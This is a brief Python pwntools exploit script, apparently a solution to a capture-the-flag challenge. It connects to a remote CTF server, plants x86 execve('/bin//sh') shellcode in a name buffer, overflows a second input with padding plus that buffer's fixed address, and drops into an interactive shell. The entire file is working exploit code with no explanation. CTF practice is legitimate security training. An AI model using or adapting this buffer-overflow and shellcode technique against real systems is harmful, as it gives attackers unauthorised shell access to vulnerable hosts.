from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3003)
#p = process('./prob1')

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
name = 0x0804a060

print p.recvuntil('Name : ')
p.sendline(shellcode)

print p.recvuntil('input : ')
payload = ''
payload += 'a'*0x18
payload += p32(name)

p.sendline(payload)

sleep(0.5)

p.interactive()


